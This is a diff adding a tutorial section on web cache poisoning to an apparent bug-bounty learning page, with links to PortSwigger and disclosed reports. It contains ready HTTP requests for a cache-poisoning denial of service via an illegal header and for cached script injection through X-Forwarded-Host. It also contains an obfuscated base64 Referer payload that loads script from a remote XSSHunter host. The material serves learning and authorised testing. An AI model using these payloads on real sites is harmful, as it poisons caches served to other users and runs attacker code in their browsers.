@@ -134,5 +134,153 @@ In the above diagram case, the referral parameter is vulnerable to RXSS and refe
 
 ### Exploiting web cache poisoning:
 
+**Everything that is not the part of cache key is part of cache poisoning attack surface**
 
+### **Methodology by James kettle**
+
+We'll use the following methodology to find cache poisoning vulnerabilities:
+
+![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/8b4c56d4-8946-4966-a01d-8418d45cf88a)
+
+Rather than attempt to explain this in depth upfront, I'll give a quick overview then demonstrate it being applied to real websites.
+
+The first step is to identify unkeyed inputs. Doing this manually is tedious so I've developed an open source Burp Suite extension called [Param Miner](https://github.com/PortSwigger/param-miner) that automates this step by guessing header/cookie names, and observing whether they have an effect on the application's response.
+
+After finding an unkeyed input, the next steps are to assess how much damage you can do with it, then try and get it stored in the cache. If that fails, you'll need to gain a better understanding of how the cache works and hunt down a cacheable target page before retrying. Whether a page gets cached may be based on a variety of factors including the file extension, content-type, route, status code, and response headers.
+
+Cached responses can mask unkeyed inputs, so if you're trying to manually detect or explore unkeyed inputs, a cache-buster is crucial. If you have Param Miner loaded, you can ensure every request has a unique cache key by adding a parameter with a value of $randomplz to the query string.
+
+When auditing a live website, accidentally poisoning other visitors is a perpetual hazard. Param Miner mitigates this by adding a cache buster to all outbound requests from Burp. This cache buster has a fixed value so you can observe caching behaviour yourself without it affecting other users.
+
+### Dos via Cache poisoning
+
+check if the application is using akamai and does not have login functionality do this:
+
+1. Send the request to repeater
+
+```
+GET /xx/xxx/test/test/?test HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
+Host: www.redacted.com
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+```
+2. Check if the server is caching normal requests (you can tell this by the response header “Server-Timing: cdn-cache; desc=HIT”)
+
+```
+HTTP/2 200 OK
+Server: REDACTED
+X-FRAME-OPTION: SAMEORIGIN
+ACCEPT_RANGE: Bytes
+CONTENT-Length: 264545
+VAR: ACCEPT-Encoding
+Set-Cookie: ak-hmac
+Server-Timing: CDN-cache; desc=HIT
+```
+
+3. Add a illegal header
+```
+GET /xx/xxx/test/test/?test HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
+Host: www.redacted.com
+\:
+Accept-Language: en-us
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+```
+
+• If the response was successfully cached, when you open the URL on any browser, you should get a 400 Bad Request
+![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/fc26d67c-e621-49f6-92c5-c9803c1d93cd)
+
+
+### Caching XSS Payload
+
+- **Stored XSS report by james kettle 2018 VIA X-Forwarded-Host Header**
+
+In spite of its fearsome reputation, cache poisoning is often very easy to exploit. To get started, let's take a look at Red Hat's homepage. Param Miner immediately spotted an unkeyed input:
+
+```
+GET /en?cb=1 HTTP/1.1
+Host: www.redhat.com
+X-Forwarded-Host: canary
+
+HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+…
+<meta property="og:image" content="https://canary/cms/social.png" />
+
+```
+Here we can see that the X-Forwarded-Host header has been used by the application to generate an Open Graph URL inside a meta tag. The next step is to explore whether it's exploitable – we'll start with a simple cross-site scripting payload:
+
+```
+GET /en?dontpoisoneveryone=1 HTTP/1.1
+Host: www.redhat.com
+X-Forwarded-Host: a."><script>alert(1)</script>
+
+HTTP/1.1 200 OK
+Cache-Control: public, no-cache
+…
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
+```
+Looks good – we've just confirmed that we can cause a response that will execute arbitrary JavaScript against whoever views it. The final step is to check if this response has been stored in a cache so that it'll be delivered to other users. Don't let the 'Cache Control: no-cache' header dissuade you – it's always better to attempt an attack than assume it won't work. You can verify first by resending the request without the malicious header, and then by fetching the URL directly in a browser on a different machine:
+
+```
+GET /en?dontpoisoneveryone=1 HTTP/1.1
+Host: www.redhat.com
+
+HTTP/1.1 200 OK
+…
+<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
+```
+
+That was easy. Although the response doesn't have any headers that suggest a cache is present, our exploit has clearly been cached. A quick DNS lookup offers an explanation – www.redhat.com is a CNAME to www.redhat.com.edgekey.net, indicating that it's using Akamai's CDN.
+
+- **stored XSS reported by bxmbn**
+
+  ```
+  GET /xxxx/xxxx/xxx HTTP/2
+Host: Redacted
+Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
+...
+```
+
+Response:
+```
+HTTP/2 200 Ok...
+Content-Type: text/html; charset=utf-8
+X-Cache: HIT
+...<html>...<script>..."Referer":"?</script>
+<svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>...
+
+```
+woke up with 35 Notifications from XSSHunter the next day, and to my surprise, 4 of them were fired on a different subdomain.
+
+![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/e9462870-7ffd-4303-92f8-d9fd681673c2)
+
+
+
+### This is are some basic poisoning method I will link all the available cache poisoning resource I could find excluding H1 disclosed, you can find more reports on hactivity.
+
+ 
+
+## Resource to learn
+
+- [Article by James kettle](https://portswigger.net/research/practical-web-cache-poisoning)
+- [bxmbn medium reports](https://bxmbn.medium.com/)
+- [Portswigger labs](https://portswigger.net/web-security/web-cache-poisoning)
+- Other Disclosed reports
+
+## well formatted 65 web caches reports for your reference
+
+[cache poisoning reports](https://www.notion.so/cache-poisoning-reports-d7c35377337b490a8ea1420c26ee871a?pvs=21)
+![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/12c7b15d-7440-4fb8-b15e-cc084b2cd0c1)
+
+### reference
+
+- [Caches](https://softwarelab.org/blog/what-is-a-cache/)
+- [Article by James kettle](https://portswigger.net/research/practical-web-cache-poisoning)
+- [bxmbn medium reports](https://bxmbn.medium.com/)
+- [Portswigger labs](https://portswigger.net/web-security/web-cache-poisoning)
+- PentesterLand
 
